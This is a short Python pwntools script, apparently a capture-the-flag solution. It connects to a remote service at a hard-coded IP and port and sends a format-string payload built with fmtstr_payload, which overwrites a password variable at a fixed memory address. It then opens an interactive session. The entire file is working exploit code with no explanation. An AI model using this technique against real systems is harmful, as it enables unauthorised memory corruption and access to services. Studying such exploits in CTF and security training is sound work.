#!/usr/bin/env python

from pwn import *

r = remote('159.65.140.117', 5007)
#r = process('../fmt/fmt')
context.log_level = 'debug'

r.recvuntil('? ')
password = 0x804a048
payload = fmtstr_payload(10, {password:1})
r.sendline(payload)
r.recvuntil(':')
r.sendline('1')
r.interactive()
